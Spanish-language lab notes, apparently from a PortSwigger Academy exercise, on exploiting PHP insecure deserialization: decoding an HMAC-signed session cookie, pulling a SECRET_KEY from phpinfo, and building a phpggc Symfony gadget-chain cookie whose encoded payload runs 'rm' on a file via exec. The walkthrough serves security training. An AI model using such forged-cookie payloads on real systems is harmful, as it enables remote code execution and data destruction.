![[portswigger_academy/expert/08_prototype_pollution/images/Pasted image 20220929174022.png]]

![[Pasted image 20221017145611.png]]

![[portswigger_academy/expert/08_prototype_pollution/images/Pasted image 20220929175332.png]]

selecciono la cookie y se activa el inspector:

![[portswigger_academy/expert/08_prototype_pollution/images/Pasted image 20220929175425.png]]

la codificacion es Base64 con un SHA1-HMAC . Inspector decodifico la cookie:

{"token":"Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJveHZxbGgwMnlubHB0czZnMXR5eWNqeTU0ZWI0ZHhoeiI7fQ==","sig_hmac_sha1":"ae88ab33c1f1c76c72c1b600ba6ec81ed51b1c57"}

la paso al decoder:

Selecciono unicamente el token y selecciono Decode as Base64:

![[portswigger_academy/expert/08_prototype_pollution/images/Pasted image 20220929175815.png]]

el resultado es este: {"token":"O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"oxvqlh02ynlpts6g1tyycjy54eb4dxhz";}","sig_hmac_sha1":"ae88ab33c1f1c76c72c1b600ba6ec81ed51b1c57"}

el cual es un objeto PHP deserializado.

En otra sesion de trabajo:
Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJzNmJhemNlZ2l6d2xvZGVoZnJ2NDhyeWZoMjFud3N6NCI7fQ

el resultado fue:
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"s6bazcegizwlodehfrv48ryfh21nwsz4";fQ


tratando de enviar un request con la cookie modificada:

![[Pasted image 20221017150544.png]]

por el contrario, si el request es exitoso hay un comentario que revela un script:

![[Pasted image 20221017151044.png]]

accediendo a phpinfo:

![[Pasted image 20221017151336.png]]

SECRET_KEY :  hgtysbfvvhby6l6ribb4y9yepxoz6cpw


instalando y ejecutando la herramienta phpggc

![[Pasted image 20221017151701.png]]

Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjQ6ImV4ZWMiO319Cg==

sustituyendo en un script php estos valores

![[Pasted image 20221017152024.png]]

ejecutando el script para generar la cookie maliciosa

![[Pasted image 20221017152200.png]]

%7B%22token%22%3A%22Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjQ6ImV4ZWMiO319Cg%3D%3D%22%2C%22sig_hmac_sha1%22%3A%22cbe5aa2bd7a768e1b8c8395395c65597e30c36d1%22%7D

pegando esta cookie maliciosa y ejecutando el payload

![[Pasted image 20221017152547.png]]

me dio un error 500


















